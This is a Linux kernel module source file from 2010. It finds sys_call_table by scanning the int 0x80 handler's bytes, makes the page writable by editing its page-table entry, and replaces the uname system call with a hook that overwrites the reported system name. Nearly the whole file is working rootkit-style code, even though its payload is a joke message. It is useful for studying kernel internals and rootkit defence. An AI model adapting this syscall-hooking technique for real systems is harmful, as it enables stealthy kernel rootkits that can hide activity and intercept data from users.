/*
* This kernel module locates the sys_call_table by scanning
* the system_call interrupt handler (int 0x80)
*
* Author: Elliot Bradbury 2010
*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/utsname.h>
#include <asm/pgtable.h>

MODULE_LICENSE("GPL");

// see desc_def.h and desc.h in arch/x86/include/asm/
// and arch/x86/kernel/syscall_64.c

typedef void (*sys_call_ptr_t)(void);
typedef asmlinkage long (*orig_uname_t)(struct new_utsname *);

void hexdump(unsigned char *addr, unsigned int length) {
    unsigned int i;
    for(i = 0; i < length; i++) {
        if(!((i+1) % 16)) {
            printk("%02x\n", *(addr + i));
        } else {
            if(!((i+1) % 4)) {
                printk("%02x  ", *(addr + i));
            } else {
                printk("%02x ", *(addr + i));
            }
        }
    }

    if(!((length+1) % 16)) {
        printk("\n");
    }
}

// fptr to original uname syscall
orig_uname_t orig_uname = NULL;

// test message
char *msg = "All ur base r belong to us";

asmlinkage long hooked_uname(struct new_utsname *name) {
    orig_uname(name);
    
    strncpy(name->sysname, msg, 27);

    return 0;
}

// and finally, sys_call_table pointer
sys_call_ptr_t *_sys_call_table = NULL;

// memory protection shinanigans
unsigned int level;
pte_t *pte;

// initialize the module
int init_module() {
    printk("+ Loading module\n");
    
    // struct for IDT register contents
    struct desc_ptr idtr;

    // pointer to IDT table of desc structs
    gate_desc *idt_table;

    // gate struct for int 0x80
    gate_desc *system_call_gate;

    // system_call (int 0x80) offset and pointer
    unsigned int _system_call_off;
    unsigned char *_system_call_ptr;

    // temp variables for scan
    unsigned int i;
    unsigned char *off;

    // store IDT register contents directly into memory
    asm ("sidt %0" : "=m" (idtr));

    // print out location
    printk("+ IDT is at %08x\n", idtr.address);

    // set table pointer
    idt_table = (gate_desc *) idtr.address;

    // set gate_desc for int 0x80
    system_call_gate = &idt_table[0x80];

    // get int 0x80 handler offset
    _system_call_off = (system_call_gate->a & 0xffff) | (system_call_gate->b & 0xffff0000);
    _system_call_ptr = (unsigned char *) _system_call_off;

    // print out int 0x80 handler
    printk("+ system_call is at %08x\n", _system_call_off);

    // print out the first 128 bytes of system_call() ...notice pattern below
    hexdump((unsigned char *) _system_call_off, 128);

    // scan for known pattern in system_call (int 0x80) handler
    // pattern is just before sys_call_table address
    for(i = 0; i < 128; i++) {
        off = _system_call_ptr + i;
        if(*(off) == 0xff && *(off+1) == 0x14 && *(off+2) == 0x85) {
            _sys_call_table = *(sys_call_ptr_t **)(off+3);
            break;
        }
    }

    // bail out if the scan came up empty
    if(_sys_call_table == NULL) {
        printk("- unable to locate sys_call_table\n");
        return 0;
    }

    // print out sys_call_table address
    printk("+ found sys_call_table at %08x!\n", _sys_call_table);

    // now we can hook syscalls ...such as uname
    // first, save the old gate (fptr)
    orig_uname = (orig_uname_t) _sys_call_table[__NR_uname];

    // unprotect sys_call_table memory page
    pte = lookup_address((unsigned long) _sys_call_table, &level);

    // change PTE to allow writing
    set_pte_atomic(pte, pte_mkwrite(*pte));

    printk("+ unprotected kernel memory page containing sys_call_table\n");

    // now overwrite the __NR_uname entry with address to our uname
    _sys_call_table[__NR_uname] = (sys_call_ptr_t) hooked_uname;

    printk("+ uname hooked!\n");

    return 0;
}

void cleanup_module() {
    if(orig_uname != NULL) {
        // restore sys_call_table to original state
        _sys_call_table[__NR_uname] = (sys_call_ptr_t) orig_uname;

        // reprotect page
        set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));
    }
    
    printk("+ Unloading module\n");
}